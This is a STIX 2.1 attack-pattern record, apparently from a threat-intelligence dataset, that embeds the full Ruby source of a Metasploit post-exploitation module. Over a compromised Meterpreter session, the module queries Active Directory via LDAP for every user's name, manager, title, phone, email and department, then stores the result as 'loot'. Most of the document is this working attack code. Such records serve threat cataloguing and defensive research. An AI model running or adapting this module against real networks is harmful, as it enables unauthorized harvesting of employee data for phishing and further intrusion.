{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--41f80a0b-3743-40bb-85a8-1ec9a408be8e",
    "created": "2024-08-14T16:33:05.028327Z",
    "modified": "2024-08-14T16:33:05.028331Z",
    "name": "Generate CSV Organizational Chart Data Using Manager Information",
    "description": " This module will generate a CSV file containing all users and their managers, which can be imported into Visio which will render it.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/make_csv_orgchart.rb",
            "external_id": "make_csv_orgchart.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Generate CSV Organizational Chart Data Using Manager Information',\n        'Description' => %q{\n          This module will generate a CSV file containing all users and their managers, which can be\n          imported into Visio which will render it.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options([\n      OptBool.new('WITH_MANAGERS_ONLY', [true, 'Only users with managers', false]),\n      OptBool.new('ACTIVE_USERS_ONLY', [true, 'Only include active users (i.e. not disabled ones)', true]),\n      OptBool.new('STORE_LOOT', [true, 'Store the organizational chart information in CSV format in loot', true]),\n      OptString.new('FILTER', [false, 'Additional LDAP filter to use when searching for users', ''])\n    ])\n  end\n\n  def run\n    max_search = datastore['MAX_SEARCH']\n    user_fields = ['cn', 'manager', 'description', 'title', 'telephoneNumber', 'department', 'division', 'userPrincipalName', 'company']\n\n    begin\n      qs = []\n      qs << '(objectCategory=person)'\n      qs << '(objectClass=user)'\n      qs << '(!userAccountControl:1.2.840.113556.1.4.803:=2)' if datastore['ACTIVE_USERS_ONLY']\n      qs << '(manager=*)' if datastore['WITH_MANAGERS_ONLY']\n      qs << \"(#{datastore['FILTER']})\" if datastore['FILTER'] != ''\n\n      query_string = \"(&(#{qs.join('')}))\"\n      vprint_status(\"Executing #{query_string}\")\n      q = query(query_string, max_search, user_fields)\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      # Can't bind or in a network w/ limited accounts\n      print_error(e.message)\n      return\n    end\n\n    if q.nil? || q[:results].empty?\n      print_status('No results returned.')\n    else\n      user_fields << 'reports_to'\n      results_table = parse_results(q[:results])\n      print_line results_table.to_s\n      if datastore['STORE_LOOT']\n        stored_path = store_loot('ad.orgchart', 'text/csv', session, results_table.to_csv)\n        print_good(\"CSV Organisational Chart Information saved to: #{stored_path}\")\n      end\n    end\n  end\n\n  # Takes the results of LDAP query, parses them into a table\n  def parse_results(results)\n    results_table = Rex::Text::Table.new(\n      'Header' => 'Users & Managers',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => ['cn', 'description', 'title', 'phone', 'department', 'division', 'e-mail', 'company', 'reports_to']\n    )\n\n    results.each do |result|\n      row = []\n\n      result.each_with_index do |field, idx|\n        next if idx == 1 # Don't include the manager DN\n\n        if field.nil?\n          row << ''\n        else\n          row << field[:value]\n        end\n      end\n\n      # Parse the manager CN string to grab the CN= field only.\n      # Note that it needs the negative lookbehind to avoid escaped characters.\n      reports_to = /^CN=(?<cn>.+?),(?<!\\\\,)/.match(result[1][:value])\n      if reports_to.nil?\n        row << ''\n      else\n        row << reports_to['cn'].gsub('\\,', ',')\n      end\n\n      results_table << row\n    end\n    results_table\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}